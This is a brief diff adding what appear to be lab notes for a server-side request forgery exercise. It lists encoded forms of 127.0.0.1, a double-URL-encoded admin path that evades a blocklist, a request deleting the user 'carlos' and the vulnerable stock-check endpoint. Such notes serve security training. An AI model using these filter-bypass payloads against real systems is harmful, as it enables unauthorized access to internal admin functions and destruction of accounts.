@@ -1,0 +1,10 @@
+local hosts --> 127.0.0.1      2130706433       017700000001        127.1
+
+localhost --> http://127.1
+
+admin host --> http://127.1/%25%36%31dmin
+
+delete carlos --> http://127.1/%25%36%31dmin/delete?username=carlos
+
+
+POST /product/stock
